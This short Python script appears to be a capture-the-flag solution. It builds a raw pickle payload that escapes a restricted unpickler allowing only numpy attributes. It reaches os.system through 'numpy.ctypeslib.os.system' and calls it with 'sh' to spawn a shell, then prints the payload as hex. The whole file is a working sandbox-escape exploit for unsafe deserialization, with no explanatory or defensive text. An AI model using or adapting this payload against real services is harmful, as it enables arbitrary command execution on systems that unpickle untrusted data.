import pickle, numpy, io
from pickle import _getattribute
class RestrictedUnpickler(pickle.Unpickler): 
     def find_class(self, module, name): 
        if module == 'numpy' and '__' not in name:
            return _getattribute(numpy, name)[0]
        raise pickle.UnpicklingError('bad')


# name = 'ctypeslib.os.system'
# print(_getattribute(numpy, name)[0])

from pickle import *

pkl = (GLOBAL + b'numpy\nctypeslib.os.system\n' +
    STRING + b'"sh"\n' +
    TUPLE1 +
    REDUCE +
    STOP
)

print(pkl.hex())
# print(RestrictedUnpickler(io.BytesIO(pkl)).load())